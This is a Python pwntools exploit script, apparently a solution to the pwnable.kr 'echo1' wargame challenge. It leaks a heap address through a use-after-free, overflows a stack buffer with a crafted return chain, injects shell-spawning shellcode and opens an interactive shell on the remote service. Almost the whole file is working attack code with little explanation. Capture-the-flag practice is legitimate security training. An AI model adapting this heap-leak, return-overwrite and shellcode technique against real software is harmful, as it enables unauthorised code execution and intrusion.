#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9010 ./echo1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./echo1")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 9010)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

# works on newer libc only

O_OFFSET = 0x2A0

io = start()

# name
io.recvuntil(b"hey, what's your name? : ")
io.sendline(b"name")

# UAF
io.recvuntil(b"> ")

io.sendline(str(4).encode())
io.sendline(b"n")

# BOF
io.recvuntil(b"> ")
io.sendline(str(1).encode())

print(repr(io.recvline()))

heap_base = u16(io.recvline(keepends=False).removeprefix(b"hello ")) << 12

o_addr = heap_base + O_OFFSET

log.info(f"leaked heap area 0x{o_addr:x}")

payload = b""
payload += p64(o_addr + 0x18 + 0x20)  # last ebp, in order to overwrite the struct
payload += p64(0x400837)  # last ret -> fgets
payload = payload.ljust(32, b"A")
payload += p64(o_addr + 0x10 + 0x20)
payload += p64(0x400848)  # puts

shellcode = asm(shellcraft.sh())

io.sendline(payload + shellcode)
io.recvline()  # echo
io.recvline()  # goodbye

leaked_stack = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
io.recvline()  # another goodbye

log.info(f"leaked stack address 0x{leaked_stack:x}")

io.sendline(p64(leaked_stack - 288))

io.interactive()
